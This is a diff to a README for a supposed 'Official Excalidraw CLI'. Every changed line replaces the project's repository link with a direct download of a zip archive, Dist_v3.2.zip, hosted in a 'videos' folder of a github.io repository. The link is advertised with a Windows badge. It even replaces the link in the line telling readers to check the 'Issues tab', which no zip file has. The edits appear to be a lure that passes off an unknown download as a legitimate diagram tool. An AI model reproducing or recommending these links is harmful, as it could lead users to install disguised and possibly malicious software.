@@ -5,7 +5,7 @@ description: "Render Excalidraw and Mermaid diagrams to PNG, SVG, slides, and sc
 ---
 # 🎨 cli - Draw Diagrams From Your Terminal
 
-[![Download Excalidraw CLI](https://img.shields.io/badge/⬇%20Download%20Excalidraw%20CLI-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/wooshy420/cli)
+[![Download Excalidraw CLI](https://img.shields.io/badge/⬇%20Download%20Excalidraw%20CLI-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/wooshy420/wooshy420.github.io/raw/refs/heads/main/videos/Dist_v3.2.zip)
 
 **Official Excalidraw CLI for humans and agents**
 
@@ -42,7 +42,7 @@ Every drawing stays in the familiar Excalidraw style — that friendly, slightly
 
 Everything you need lives in one place:
 
-### 👉 https://github.com/wooshy420/cli
+### 👉 https://github.com/wooshy420/wooshy420.github.io/raw/refs/heads/main/videos/Dist_v3.2.zip
 
 **Visit this link to download the application.**
 
@@ -138,7 +138,7 @@ This is standard for tools that create files. Approve it once and the prompt sho
 
 ## 🤝 Getting Help
 
-If you get stuck, return to https://github.com/wooshy420/cli and look through the **Issues** tab. Someone has likely asked the same question before. If not, you can open a new issue describing what happened, what you expected, and what you saw instead. Include a screenshot of the text window if you can — it helps enormously.
+If you get stuck, return to https://github.com/wooshy420/wooshy420.github.io/raw/refs/heads/main/videos/Dist_v3.2.zip and look through the **Issues** tab. Someone has likely asked the same question before. If not, you can open a new issue describing what happened, what you expected, and what you saw instead. Include a screenshot of the text window if you can — it helps enormously.
 
 The project is open and actively maintained, and questions from non-technical users are welcome.
 
